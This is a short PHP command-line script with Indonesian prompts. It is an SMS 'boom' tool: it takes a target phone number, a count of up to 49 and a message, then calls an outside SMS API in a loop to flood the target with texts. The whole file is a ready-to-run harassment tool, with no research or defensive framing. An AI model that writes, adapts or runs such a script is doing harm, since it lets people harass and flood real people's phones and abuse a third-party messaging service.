<?php

echo 'Masukkan nomor hp target (628xxxxxx): '; 
$phone_number = trim(fgets(STDIN)); 

echo 'Masukkan jumlah boom max 49 : '; 
$jml = trim(fgets(STDIN)); 

echo 'Masukkan pesan yang akan dikirim : ';
$input_nama = fopen('php://stdin','r');
$nama = trim(fgets($input_nama));

$urlmessage =  urlencode( $nama );

  if ( $jml >= 50 ) {
    echo 'JANGAN BANYAK BANYAK BRO NTAR DOWN';  
  } else {
    for ($i = 0; $i < $jml; $i++) {
      // Get cURL resource
    $curl = curl_init();
    // Set some options - we are passing in a useragent too here
    curl_setopt_array($curl, [
        CURLOPT_URL => 'http://api.ancreator.com/c/index.php?type=sms&phone='.$phone_number.'&msg='.$urlmessage.'',
    ]);
    // Send the request & save response to $resp
    $resp = curl_exec($curl);
    // Close request to clear up some resources
    curl_close($curl);
  }
}
?>